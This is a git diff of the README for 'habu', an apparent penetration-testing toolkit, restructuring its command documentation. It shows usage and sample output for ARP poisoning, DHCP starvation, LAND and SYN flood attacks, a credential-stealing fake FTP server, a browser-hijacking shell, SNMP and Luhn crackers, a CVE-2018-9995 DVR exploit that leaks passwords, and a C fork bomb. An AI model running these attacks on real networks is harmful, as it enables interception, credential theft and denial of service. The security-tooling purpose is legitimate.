@@ -89,355 +89,666 @@ arguments, options, and default values.
 Almost all commands implement the verbose mode with the '-v' option.
 This can give you some extra info about what habu is doing.
 
-## habu.arpoison: ARP Poisoning
 
-This command sends ARP 'is-at' packets to each victim, poisoning their
-ARP tables for send the traffic to your system.
 
-**Note**: If you want a full working Man In The Middle attack, you need
-to enable the packet forwarding on your operating system to act like a
-router. You can do that using:
+## habu.arping
+
 
 ``` {.sourceCode .bash}
-echo 1 > /proc/sys/net/ipv4/ip_forward
+Usage: habu.arping [OPTIONS] IP
+
+  Send ARP packets to check if a host it's alive in the local network.
+
+  Example:
+
+  # habu.arping 192.168.0.1
+  Ether / ARP is at a4:08:f5:19:17:a4 says 192.168.0.1 / Padding
+
+Options:
+  -i TEXT  Interface to use
+  -v       Verbose output
+  --help   Show this message and exit.
 ```
 
+
+## habu.arpoison
+
+
 ``` {.sourceCode .bash}
-Usage: habu.arpoison [OPTIONS] T1 T2
+Usage: habu.arpoison [OPTIONS] VICTIM1 VICTIM2
+
+  Send ARP 'is-at' packets to each victim, poisoning their ARP tables for
+  send the traffic to your system.
+
+  Note: If you want a full working Man In The Middle attack, you need to
+  enable the packet forwarding on your operating system to act like a
+  router. You can do that using:
+
+  # echo 1 > /proc/sys/net/ipv4/ip_forward
+
+  Example:
+
+  # habu.arpoison 192.168.0.1 192.168.0.77
+  Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
+  Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.70
+  Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
+  ...
 
 Options:
   -i TEXT  Interface to use
   -v       Verbose
   --help   Show this message and exit.
-
-Example:
-
-$ sudo habu.arpoison 192.168.1.5 192.168.1.6
-Ether / ARP is at 00:c2:c6:30:2c:58 says 192.168.1.6
-Ether / ARP is at 00:c2:c6:30:2c:58 says 192.168.1.5
-Ether / ARP is at 00:c2:c6:30:2c:58 says 192.168.1.6
-Ether / ARP is at 00:c2:c6:30:2c:58 says 192.168.1.5
-...
 ```
 
-## habu.arpsniff: Discover devices on your LAN capturing ARP packets
 
-This command listen for ARP packets and shows information each device.
+## habu.arpsniff
 
-Columns: Seconds from last packet | IP | MAC | Vendor
 
 ``` {.sourceCode .bash}
+Usage: habu.arpsniff [OPTIONS]
+
+  Listen for ARP packets and show information for each device.
+
+  Columns: Seconds from last packet | IP | MAC | Vendor
+
+  Example:
+
+  1   192.168.0.1     a4:08:f5:19:17:a4   Sagemcom Broadband SAS
+  7   192.168.0.2     64:bc:0c:33:e5:57   LG Electronics (Mobile Communications)
+  2   192.168.0.5     00:c2:c6:30:2c:58   Intel Corporate
+  6   192.168.0.7     54:f2:01:db:35:58   Samsung Electronics Co.,Ltd
+
 Options:
   -i TEXT  Interface to use
   --help   Show this message and exit.
-
-
-
-1   192.168.0.1     a4:08:f5:19:17:a4   Sagemcom Broadband SAS
-7   192.168.0.2     64:bc:0c:33:e5:57   LG Electronics (Mobile Communications)
-2   192.168.0.5     00:c2:c6:30:2c:58   Intel Corporate
-6   192.168.0.7     54:f2:01:db:35:58   Samsung Electronics Co.,Ltd
 ```
 
-## habu.asydns: AsyDNS protocol client
 
-This command requests DNS domain names based on public and private 
-RSA keys using the AsyDNS protocol (<https://github.com/portantier/asydns>).
+## habu.asydns
+
 
 ``` {.sourceCode .bash}
-$ habu.asydns -v
-Generating RSA key ...
-Loading RSA key ...
-{
-    "ip": "181.31.41.231",
-    "name": "07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org"
-}
+Usage: habu.asydns [OPTIONS]
 
-$ dig +short 07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org
-181.31.41.231
+  Requests a DNS domain name based on public and private RSA keys using the
+  AsyDNS protocol https://github.com/portantier/asydns
+
+  Example:
+
+  $ habu.asydns -v
+  Generating RSA key ...
+  Loading RSA key ...
+  {
+      "ip": "181.31.41.231",
+      "name": "07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org"
+  }
+
+  $ dig +short 07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org
+  181.31.41.231
+
+Options:
+  -u TEXT  API URL
+  -g       Force the generation of a new key pair
+  -r       Revoke the public key
+  -v       Verbose output
+  --help   Show this message and exit.
 ```
 
-## habu.certclone: Clone a SSL/TLS server certificate
 
-This command tries to connect to a SSL/TLS server, gets the certificate and generates 
-a certificate with the same options and field values.
+## habu.b64
 
-**Note**: The generated certificate it's invalid, but can be used for social engineering attacks
 
 ``` {.sourceCode .bash}
-$ habu.certclone www.google.com 443 /tmp/key.pem /tmp/cert.pem
+Usage: habu.b64 [OPTIONS] [F]
+
+  Encodes or decode data in base64, just like the command base64.
+
+  $ echo awesome | habu.b64
+  YXdlc29tZQo=
+
+  $ echo YXdlc29tZQo= | habu.b64 -d
+  awesome
+
+Options:
+  -d      decode instead of encode
+  --help  Show this message and exit.
 ```
 
-## habu.contest: Check your connection capabilities
 
-This command tries to connect to various services and check if you can
-reach them using your internet connection.
+## habu.certclone
+
 
 ``` {.sourceCode .bash}
-$ habu.contest 
-IP:    True
-DNS:   True
-FTP:   True
-SSH:   True
-HTTP:  True
-HTTPS: True
+Usage: habu.certclone [OPTIONS] HOSTNAME PORT KEYFILE CERTFILE
+
+  Connect to an SSL/TLS server, get the certificate and generate a
+  certificate with the same options and field values.
+
+  Note: The generated certificate is invalid, but can be used for social
+  engineering attacks
+
+  Example:
+
+  $ habu.certclone www.google.com 443 /tmp/key.pem /tmp/cert.pem
+
+Options:
+  --copy-extensions  Copy certificate extensions (default: False)
+  --expired          Generate an expired certificate (default: False)
+  -v                 Verbose
+  --help             Show this message and exit.
 ```
 
-## habu.contest: Check your connection capabilities
 
-a Luhn algorithm number cracker.
+## habu.contest
 
-You can pass an incomplete creditcard-like number and you will receive the
-valid number combinations based on all the posibilities that validates
-against the Luhn algorithm.
 
-Other numbers that use the Luhn algorithm for validation are IMEI numbers,
-National Provider Identifier numbers in the United States, Canadian Social
-Insurance Numbers, Israel ID Numbers and Greek Social Security Numbers
-(ΑΜΚΑ).
+``` {.sourceCode .bash}
+Usage: habu.contest [OPTIONS]
 
-The '-' characters are ignored.
+  Try to connect to various services and check if can reach them using your
+  internet connection.
 
-Define the missing numbers with the 'x' character.
+  Example:
 
-$ habu.crack_luhn 4509-xxxx-3160-6445
+  $ habu.contest
+  IP:    True
+  DNS:   True
+  FTP:   True
+  SSH:   True
+  HTTP:  True
+  HTTPS: True
 
-Reference: https://en.wikipedia.org/wiki/Luhn_algorithm
+Options:
+  --help  Show this message and exit.
+```
 
+
+## habu.crack.luhn
+
+
+``` {.sourceCode .bash}
 Usage: habu.crack.luhn [OPTIONS] NUMBER
 
+  Having known values for a Luhn validated number, obtain the possible
+  unknown numbers.
 
-## habu.ctfr: Subdomain mapping
+  Numbers that use the Luhn algorithm for validation are Credit Cards, IMEI,
+  National Provider Identifier in the United States, Canadian Social
+  Insurance Numbers, Israel ID Numbers and Greek Social Security Numbers
+  (ΑΜΚΑ).
 
-This command downloads the certificate transparency logs for a domain
-and check with DNS queries if each subdomain exists.
+  The '-' characters are ignored.
 
-Uses multithreading to improve the performance of the DNS queries.
+  Define the missing numbers with the 'x' character.
 
-``` {.sourceCode .bash}
-$ sudo habu.ctrf securetia.com
-[
-    "karma.securetia.com.",
-    "www.securetia.com."
-]
-...
+  Reference: https://en.wikipedia.org/wiki/Luhn_algorithm
+
+  Example:
+
+  $ habu.crack.luhn 4509-xxxx-3160-6445
+
+Options:
+  --help  Show this message and exit.
 ```
 
-You can disable the DNS verification with the option '-n'.
 
-**Note**: This command it's based on code from
-<https://github.com/UnaPibaGeek/ctfr>
+## habu.crack.snmp
 
-## habu.dhcp\_discover: Discover DHCP servers
-
-This command send a DHCP request and shows what devices has replied.
-Using the '-v' parameter (verbose) you can see all the options (like DNS
-servers) included on the responses.
 
 ``` {.sourceCode .bash}
-$ sudo habu.dhcp_discover 
-Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.5:bootpc / BOOTP / DHCP
+Usage: habu.crack.snmp [OPTIONS] IP
+
+  Launches snmp-get queries against an IP, and tells you when finds a valid
+  community string (is a simple SNMP cracker).
+
+  The dictionary used is the distributed with the onesixtyone tool
+  https://github.com/trailofbits/onesixtyone
+
+  Example:
+
+  # habu.crack.snmp 179.125.234.210
+  Community found: private
+  Community found: public
+
+  Note: You can also receive messages like \<UNIVERSAL\> \<class
+  'scapy.asn1.asn1.ASN1\_Class\_metaclass'\>, I don't know how to supress
+  them for now.
+
+Options:
+  -p INTEGER  Port to use
+  -s          Stop after first match
+  -v          Verbose
+  --help      Show this message and exit.
 ```
 
-## habu.dhcp\_starvation: Fill the DHCP leases
 
-This command send multiple DHCP requests from forged MAC addresses to
-fill the DHCP server leases. When all the available network addresses
-are assigned, the DHCP server don't send responses. So, some attacks,
-like DHCP spoofing can be made.
+## habu.ctfr
+
 
 ``` {.sourceCode .bash}
-$ sudo habu.dhcp_starvation 
-Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.6:bootpc / BOOTP / DHCP
-Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.7:bootpc / BOOTP / DHCP
-Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.8:bootpc / BOOTP / DHCP
+Usage: habu.ctfr [OPTIONS] DOMAIN
+
+  Downloads the certificate transparency logs for a domain and check with
+  DNS queries if each subdomain exists.
+
+  Uses multithreading to improve the performance of the DNS queries.
+
+  Example:
+
+  $ sudo habu.ctrf securetia.com
+  [
+      "karma.securetia.com.",
+      "www.securetia.com."
+  ]
+
+Options:
+  -c      Disable cache
+  -n      Disable DNS subdomain validation
+  -v      Verbose output
+  --help  Show this message and exit.
 ```
 
-## habu.eicar: Prints the EICAR test string
 
-This command prints the EICAR test string that can be used to test
-antimalware engines. More info:
-<http://www.eicar.org/86-0-Intended-use.html>
+## habu.cve.2018.9995
+
 
 ``` {.sourceCode .bash}
-$ habu.eicar 
-X5O!P%@AP[4\XZP54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+Usage: habu.cve.2018.9995 [OPTIONS] IP
+
+  Exploit the CVE-2018-9995 vulnerability, present on various DVR systems.
+
+  Note: Based on the original code from Ezequiel Fernandez (@capitan_alfa).
+
+  Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995
+
+  Example:
+
+  $ python habu.cve.2018-9995 82.202.102.42
+  [
+      {
+          "uid": "admin",
+          "pwd": "securepassword",
+          "role": 2,
+          "enmac": 0,
+          "mac": "00:00:00:00:00:00",
+          "playback": 4294967295,
+          "view": 4294967295,
+          "rview": 4294967295,
+          "ptz": 4294967295,
+          "backup": 4294967295,
+          "opt": 4294967295
+      }
+  ]
+
+Options:
+  -p INTEGER  Port to use (default: 80)
+  -v          Verbose
+  --help      Show this message and exit.
 ```
 
-**Note:** The below string is incorrect because is not a good idea write
-the complete in this text file. Some antivirus program can be detect it
-like a virus. :)
 
-## habu.hasher: Computes various hashes with the input data
+## habu.dhcp.discover
 
-This command computes various hashes for the input data, that can be a
-file or a stream.
-
-If the filename is '-', the data is taken from the standard input
-(stdin) so, three different variants exists to call this command:
 
 ``` {.sourceCode .bash}
-$ habu.hasher README.rst 
-md5  : 375375d9cfb2aacab7c8d1a9afd3d9b7
-sha1 : 21c67b9ef44bc24d47eef6adab648ba34662927e
+Usage: habu.dhcp.discover [OPTIONS]
 
-$ cat README.rst | habu.hasher -
-md5  : 375375d9cfb2aacab7c8d1a9afd3d9b7
-sha1 : 21c67b9ef44bc24d47eef6adab648ba34662927e
+  Send a DHCP request and show what devices has replied.
 
-$ habu.hasher - < README.rst 
-md5  : 375375d9cfb2aacab7c8d1a9afd3d9b7
-sha1 : 21c67b9ef44bc24d47eef6adab648ba34662927e
+  Note: Using '-v' you can see all the options (like DNS servers) included
+  on the responses.
+
+  # habu.dhcp_discover
+  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.5:bootpc / BOOTP / DHCP
+
+Options:
+  -i TEXT     Interface to use
+  -t INTEGER  Time (seconds) to wait for responses
+  -v          Verbose output
+  --help      Show this message and exit.
 ```
 
-**Note:** The output above shows only MD5 and SHA1 to make it short, but
-the real output includes more algorithms.
 
-You can also specify which algorithm to use. In such case, the output is
-only the value of the calculated hash:
+## habu.dhcp.starvation
+
 
 ``` {.sourceCode .bash}
-$ habu.hasher -a md5 README.rst
-375375d9cfb2aacab7c8d1a9afd3d9b7
+Usage: habu.dhcp.starvation [OPTIONS]
+
+  Send multiple DHCP requests from forged MAC addresses to fill the DHCP
+  server leases.
+
+  When all the available network addresses are assigned, the DHCP server
+  don't send responses.
+
+  So, some attacks, like DHCP spoofing, can be made.
+
+  # habu.dhcp_starvation
+  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.6:bootpc / BOOTP / DHCP
+  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.7:bootpc / BOOTP / DHCP
+  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.8:bootpc / BOOTP / DHCP
+
+Options:
+  -i TEXT     Interface to use
+  -t INTEGER  Time (seconds) to wait for responses
+  -s INTEGER  Time (seconds) between requests
+  -v          Verbose output
+  --help      Show this message and exit.
 ```
 
-## habu.ip: Prints your current public IP
 
-This command prints your current public IP based on the response from
-<https://api.ipify.org>.
+## habu.eicar
+
 
 ``` {.sourceCode .bash}
-$ habu.ip 
-182.26.32.246
+Usage: habu.eicar [OPTIONS]
+
+  Print the EICAR test string that can be used to test antimalware engines.
+
+  More info: http://www.eicar.org/86-0-Intended-use.html
+
+  Example:
+
+  $ habu.eicar
+  X5O!P%@AP[4\XZP54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+Options:
+  --help  Show this message and exit.
 ```
 
-## habu.ip2asn: IP to ASN mapping
-This command uses Team Cymru ip2asn service to get information about a public
-IPv4/IPv6.
+
+## habu.extract.email
+
 
 ``` {.sourceCode .bash}
-$ habu.ip2asn 8.8.8.8
-{
-    "asn": "15169",
-    "net": "8.8.8.0/24",
-    "cc": "US",
-    "rir": "ARIN",
-    "asname": "GOOGLE - Google LLC, US",
-    "country": "United States"
-}
+Usage: habu.extract.email [OPTIONS] [INFILE]
+
+  Extract email addresses from a file or stdin.
+
+  Example:
+
+  $ cat /var/log/auth.log | habu.extract.email
+  john@securetia.com
+  raven@acmecorp.net
+  nmarks@fimax.com
+
+Options:
+  -v      Verbose output
+  -j      JSON output
+  --help  Show this message and exit.
 ```
 
-## habu.isn: Prints the TCP sequence numbers for an IP
 
-This command creates TCP connections and prints the TCP initial sequence
-numbers for each connections.
+## habu.extract.ipv4
+
 
 ``` {.sourceCode .bash}
-$ sudo habu.isn www.portantier.com
-1962287220
-1800895007
-589617930
-3393793979
-469428558
+Usage: habu.extract.ipv4 [OPTIONS] [INFILE]
+
+  Extract IPv4 addresses from a file or stdin.
+
+  Example:
+
+  $ cat /var/log/auth.log | habu.extract.ipv4
+  172.217.162.4
+  23.52.213.96
+  190.210.43.70
+
+Options:
+  --json  JSON output
+  -v      Verbose output
+  --help  Show this message and exit.
 ```
 
-You can get a graphical representation (needs the matplotlib package)
-using the '-g' option:
+
+## habu.forkbomb
+
 
 ``` {.sourceCode .bash}
-$ sudo habu.isn -g -c 10 www.portantier.com
+Usage: habu.forkbomb [OPTIONS] BOMB
+
+  A shortcut to remember how to use fork bombs in different languages.
+
+  Currently supported: bash, batch, c, haskell, perl, php, python, ruby.
+
+  Example:
+
+  #include <unistd.h>
+  int main()
+  {
+      while(1)
+      {
+          fork();
+      }
+      return 0;
+  }
+
+Options:
+  --help  Show this message and exit.
 ```
 
-![image](img/isn.png)
 
-**Note:** The above command uses '-c' option to define that 10
-connections must be created.
+## habu.hasher
 
-## habu.jshell: JavaScript Shell that uses WebSockets
-
-This is one of the most complex commands in Habu. When you start it,
-binds a port (default: 3333) and listen for HTTP connections. If
-receives a connection, sends a JavaScript code that opens a WebSocket
-(<https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API>) that
-can be used to send commands to the connected browser.
-
-You can write the commands directly in the shell, or use plugins, that
-are simply external JavaScript files.
-
-Using habu.jshell you can completely control a web browser.
-
-**Note:** The complete documentation of the module will be separated
-from the main documentation, because this module has a lot of options
-and commands.
 
 ``` {.sourceCode .bash}
-$ habu.jshell 
->>> Listening on 192.168.0.10:3333. Waiting for a victim connection.
->>> HTTP Request received from 192.168.0.15. Sending hookjs
->>> Connection from 192.168.0.15
-$ _sessions
-0 * 192.168.0.15:33432 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
-$ _info
-{
-    "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
-    "location": "http://192.168.0.10:3333/",
-    "java-enabled": false,
-    "platform": "Linux x86_64",
-    "app-code-name": "Mozilla",
-    "app-name": "Netscape",
-    "app-version": "5.0 (X11)",
-    "cookie-enabled": true,
-    "language": "es-AR",
-    "online": true
-}
-$ document.location
-http://192.168.0.10:3333/
+Usage: habu.hasher [OPTIONS] [F]
+
+  Computes various hashes for the input data, that can be a file or a
+  stream.
+
+  Example:
+
+  $ habu.hasher README.rst
+  md5         : e5828c564f71fea3a12dde8bd5d27063
+  ripemd160   : ef6886c3b68cb34a44f9ca9336f3cd0732600a84
+  sha1        : 7bae8076a5771865123be7112468b79e9d78a640
+  sha512      : 65cfb1cf719b851b4aea5a7f5388068687b1fdfd290817a...
+  whirlpool   : eaccf718b31d8a01f76fc08e896a6d0d73dbeafc2621fe0...
+
+  You can also specify which algorithm to use. In such case, the output is
+  only the value of the calculated hash:
+
+  $ habu.hasher -a md5 README.rst
+  e5828c564f71fea3a12dde8bd5d27063
+
+Options:
+  -a [md5|sha1|sha512|ripemd160|whirlpool]
+                                  Only this algorithm (Default: all)
+  --help                          Show this message and exit.
 ```
 
-## habu.karma: Karma API client
 
-Uses the Karma service (<https://karma.securetia.com>) to check an IP
-against a lot of Threat Intelligence / Reputation lists.
+## habu.ip2asn
+
 
 ``` {.sourceCode .bash}
-habu.karma www.google.com
-www.google.com -> 64.233.190.99
-[
-    "hphosts_fsa",
-    "hphosts_psh",
-    "hphosts_emd"
-]
+Usage: habu.ip2asn [OPTIONS] IP
+
+  Use Team Cymru ip2asn service to get information about a public IPv4/IPv6.
+
+  Reference: https://www.team-cymru.com/IP-ASN-mapping.html
+
+  $ habu.ip2asn 8.8.8.8
+  {
+      "asn": "15169",
+      "net": "8.8.8.0/24",
+      "cc": "US",
+      "rir": "ARIN",
+      "asname": "GOOGLE - Google LLC, US",
+      "country": "United States"
+  }
+
+Options:
+  --help  Show this message and exit.
 ```
 
-**Note:** You can use the hostname or the IP of the host to query.
 
-## habu.land: Implements the LAND attack
+## habu.ip
 
-This command implements the LAND attack, that sends packets forging the
-source IP address to be the same that the destination IP. Also uses the
-same source and destination port.
-
-The attack is very old, and can be used to make a Denial of Service on
-old systems, like Windows NT 4.0. More information here:
-<https://en.wikipedia.org/wiki/LAND>
 
 ``` {.sourceCode .bash}
-$ sudo habu.land 172.16.0.10
-............
 ```
 
-**Note:** Each dot (.) is a sent packet. You can specify how many
-packets send with the '-c' option. The default is never stop. Also, you
-can specify the destination port, with the '-p' option.
 
-## habu.nc: Netcat like program
+## habu.isn
 
-This command is some kind of netcat/ncat replacement.
 
-The execution emulates the feeling of this popular tools.
+``` {.sourceCode .bash}
+Usage: habu.isn [OPTIONS] IP
+
+  Create TCP connections and print the TCP initial sequence numbers for each
+  one.
+
+  $ sudo habu.isn -c 5 www.portantier.com
+  1962287220
+  1800895007
+  589617930
+  3393793979
+  469428558
+
+  Note: You can get a graphical representation (needs the matplotlib
+  package) using the '-g' option to better understand the randomness.
+
+Options:
+  -p INTEGER  Port to use (default: 80)
+  -c INTEGER  How many packets to send/receive (default: 5)
+  -i TEXT     Interface to use
+  -g          Graph (requires matplotlib)
+  -v          Verbose output
+  --help      Show this message and exit.
+```
+
+
+## habu.jshell
+
+
+``` {.sourceCode .bash}
+Usage: habu.jshell [OPTIONS]
+
+  Control a web browser through Websockets.
+
+  Bind a port (default: 3333) and listen for HTTP connections.
+
+  On connection, send a JavaScript code that opens a WebSocket that can be
+  used to send commands to the connected browser.
+
+  You can write the commands directly in the shell, or use plugins, that are
+  simply external JavaScript files.
+
+  Using habu.jshell you can completely control a web browser.
+
+  Reference: https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API
+
+  Example:
+
+  $ habu.jshell
+  >> Listening on 192.168.0.10:3333. Waiting for a victim connection.
+  >> HTTP Request received from 192.168.0.15. Sending hookjs
+  >> Connection from 192.168.0.15
+  $ _sessions
+  0 * 192.168.0.15:33432 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
+  $ _info
+  {
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
+      "location": "http://192.168.0.10:3333/",
+      "java-enabled": false,
+      "platform": "Linux x86_64",
+      "app-code-name": "Mozilla",
+      "app-name": "Netscape",
+      "app-version": "5.0 (X11)",
+      "cookie-enabled": true,
+      "language": "es-AR",
+      "online": true
+  }
+  $ document.location
+  http://192.168.0.10:3333/
+
+Options:
+  -v          Verbose
+  -i TEXT     IP to listen on
+  -p INTEGER  Port to listen on
+  --help      Show this message and exit.
+```
+
+
+## habu.karma
+
+
+``` {.sourceCode .bash}
+Usage: habu.karma [OPTIONS] HOST
+
+  Use the Karma service https://karma.securetia.com to check an IP against
+  various Threat Intelligence / Reputation lists.
+
+  $ habu.karma www.google.com
+  www.google.com -> 64.233.190.99
+  [
+      "hphosts_fsa",
+      "hphosts_psh",
+      "hphosts_emd"
+  ]
+
+  Note: You can use the hostname or the IP of the host to query.
+
+Options:
+  --help  Show this message and exit.
+```
+
+
+## habu.land
+
+
+``` {.sourceCode .bash}
+Usage: habu.land [OPTIONS] IP
+
+  This command implements the LAND attack, that sends packets forging the
+  source IP address to be the same that the destination IP. Also uses the
+  same source and destination port.
+
+  The attack is very old, and can be used to make a Denial of Service on old
+  systems, like Windows NT 4.0. More information here:
+  https://en.wikipedia.org/wiki/LAND
+
+  # sudo habu.land 172.16.0.10
+  ............
+
+  Note: Each dot (.) is a sent packet. You can specify how many packets send
+  with the '-c' option. The default is never stop. Also, you can specify the
+  destination port, with the '-p' option.
+
+Options:
+  -c INTEGER  How many packets send (default: infinit)
+  -p INTEGER  Port to use (default: 135)
+  -i TEXT     Interface to use
+  -v          Verbose
+  --help      Show this message and exit.
+```
+
+
+## habu.nc
+
 
 ``` {.sourceCode .bash}
 Usage: habu.nc [OPTIONS] HOST PORT
+
+  Some kind of netcat/ncat replacement.
+
+  The execution emulates the feeling of this popular tools.
+
+  Example:
+
+  $ habu.nc --crlf www.portantier.com 80
+  Connected to 45.77.113.133 80
+  HEAD / HTTP/1.0
+
+  HTTP/1.0 301 Moved Permanently
+  Date: Thu, 26 Jul 2018 21:10:51 GMT
+  Server: OpenBSD httpd
+  Connection: close
+  Content-Type: text/html
+  Content-Length: 443
+  Location: https://www.portantier.com/
 
 Options:
   --family [4|6|46]            IP Address Family
@@ -446,43 +757,90 @@ Options:
   --protocol [tcp|udp]         Layer 4 protocol to use
   --source-ip TEXT             Source IP to use
   --source-port INTEGER RANGE  Source port to use
-
-Example:
-
-$ habu.nc --crlf www.portantier.com 80
-Connected to 45.77.113.133 80
-HEAD / HTTP/1.0
-
-HTTP/1.0 301 Moved Permanently
-Date: Thu, 26 Jul 2018 21:10:51 GMT
-Server: OpenBSD httpd
-Connection: close
-Content-Type: text/html
-Content-Length: 443
-Location: https://www.portantier.com/
+  --help                       Show this message and exit.
 ```
 
-## habu.ping: ICMP echo requests
 
-This command implements the classic 'ping' with ICMP echo requests.
+## habu.ping
+
 
 ``` {.sourceCode .bash}
-$ sudo habu.ping 8.8.8.8
-IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
-IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
-IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
-IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+Usage: habu.ping [OPTIONS] IP
+
+  The classic ping tool that send ICMP echo requests.
+
+  # habu.ping 8.8.8.8
+  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+
+Options:
+  -i TEXT     Wich interface to use (default: auto)
+  -c INTEGER  How many packets send (default: infinit)
+  -t INTEGER  Timeout in seconds (default: 2)
+  -w INTEGER  How many seconds between packets (default: 1)
+  -v          Verbose
+  --help      Show this message and exit.
 ```
 
-## habu.server.ftp: Fake FTP Server
 
-This command implements a basic fake FTP server, whith the only purpose to 
-steal user credentials.
+## habu.protoscan
 
-The server supports SSL/TLS.
+
+``` {.sourceCode .bash}
+Usage: habu.protoscan [OPTIONS] IP
+
+  Send IP packets with different protocol field content to guess what layer
+  4 protocols are available.
+
+  The output shows which protocols doesn't generate a 'protocol-unreachable'
+  ICMP response.
+
+  Example:
+
+  $ sudo python cmd_ipscan.py 45.77.113.133
+  1   icmp
+  2   igmp
+  4   ipencap
+  6   tcp
+  17  udp
+  41  ipv6
+  47  gre
+  50  esp
+  51  ah
+  58  ipv6_icmp
+  97  etherip
+  112 vrrp
+  115 l2tp
+  132 sctp
+  137 mpls_in_ip
+
+Options:
+  -i TEXT     Interface to use
+  -t INTEGER  Timeout for each probe (default: 2 seconds)
+  --all       Probe all protocols (default: Defined in /etc/protocols)
+  -v          Verbose output
+  --help      Show this message and exit.
+```
+
+
+## habu.server.ftp
+
 
 ``` {.sourceCode .bash}
 Usage: habu.server.ftp [OPTIONS]
+
+  Basic fake FTP server, whith the only purpose to steal user credentials.
+
+  Supports SSL/TLS.
+
+  Example:
+
+  # sudo habu.server.ftp --ssl --ssl-cert /tmp/cert.pem --ssl-key /tmp/key.pem
+  Listening on port 21
+  Accepted connection from ('192.168.0.27', 56832)
+  Credentials collected from 192.168.0.27! fabian 123456
 
 Options:
   -a TEXT          Address to bind (default: all)
@@ -492,252 +850,375 @@ Options:
   --ssl-key TEXT   SSL/TLS Key file
   -v               Verbose
   --help           Show this message and exit.
-
-Example:
-
-$ sudo habu.server.ftp -p 21 --ssl --ssl-cert /tmp/cert.pem --ssl-key /tmp/key.pem
-Listening on port 2121
-Accepted connection from ('192.168.0.27', 56832)
-Credentials collected from 192.168.0.27! fabian 123456
-```
-
-## habu.shodan: Shodan API client
-
-This command is a simple shodan API client with prints the json result 
-of a shodan query (or saves it on a file).
-
-**Note:** Output cut for brevity.
-
-``` {.sourceCode .bash}
-$ habu.shodan 8.8.8.8
-{
-    "hostnames": [
-        "google-public-dns-a.google.com"
-    ],
-    "country_code": "US",
-    "org": "Google",
-    "data": [
-        {
-            "isp": "Google",
-            "transport": "udp",
-            "data": "\nRecursion: enabled",
-            "asn": "AS15169",
-            "port": 53,
-            "hostnames": [
-                "google-public-dns-a.google.com"
-            ],
-            "location": {
-                "longitude": -97.822,
-                "country_code3": "USA",
-                "latitude": 37.751000000000005,
-                "country_code": "US",
-                "country_name": "United States"
-            }
-        }
-    ],
-    "ports": [
-        53
-    ]
-}
-```
-
-## habu.snmp\_crack: SNMP Community Cracker
-
-This command launches snmp-get queries against an IP, and tells you when
-finds a valid community string (is a simple SNMP cracker).
-
-The dictionary used is the distributed with the onesixtyone tool
-(<https://github.com/trailofbits/onesixtyone>)
-
-``` {.sourceCode .bash}
-$ sudo habu.snmp_crack 179.125.234.210 
-Community found: private
-Community found: public
-```
-
-**Note:** You can also receive messages like \<UNIVERSAL\> \<class
-'scapy.asn1.asn1.ASN1\_Class\_metaclass'\>, I don't know how to supress
-them for now.
-
-## habu.synflood: SYN Flood Attack Implementation
-
-This command launches a lot of TCP connections and keeps them opened.
-Some very old systems can suffer a Denial of Service with this. More
-info: <https://en.wikipedia.org/wiki/SYN_flood>
-
-``` {.sourceCode .bash}
-$ sudo habu.synflood 172.16.0.10
-.................
-```
-
-Each dot is a packet sent.
-
-You can use the options '-2' and '-3' to forge the layer 2/3 addresses.
-If you use them, each connection will be sent from a random layer2 (MAC)
-and/or layer3 (IP) address.
-
-You can choose the number of connections to create with the option '-c'.
-The default is never stop creating connections.
-
-**Note:** If you send the packets from your real IP address and you want
-to keep the connections half-open, you need to setup for firewall to
-don't send the RST packets. With habu, you can do this with the
-following command (only works with Linux+IPTables):
-
-``` {.sourceCode .bash}
-$ sudo habu.firewall --no-rst
-```
-
-You can check the results with "iptables -L -n", and you will see
-something like this:
-
-``` {.sourceCode .bash}
-Chain OUTPUT (policy ACCEPT)
-target     prot opt source               destination         
-DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp flags:0x04/0x04
-```
-
-## habu.tcpflags: TCP Flag Fuzzer
-
-This command send TCP packets with different flags and tell you what
-responses receives.
-
-It can be used to analyze how the different TCP/IP stack implementations
-and configurations responds to packet with various flag combinations.
-
-``` {.sourceCode .bash}
-$ sudo habu.tcpflags www.portantier.com
-S  -> SA
-FS -> SA
-FA -> R
-SA -> R
-```
-
-By default, the command sends all possible flag combinations. You can
-specify which flags must ever be present (reducing the quantity of
-possible combinations), with the option '-f'.
-
-Also, you can specify which flags you want to be present on the response
-packets to show, with the option '-r'.
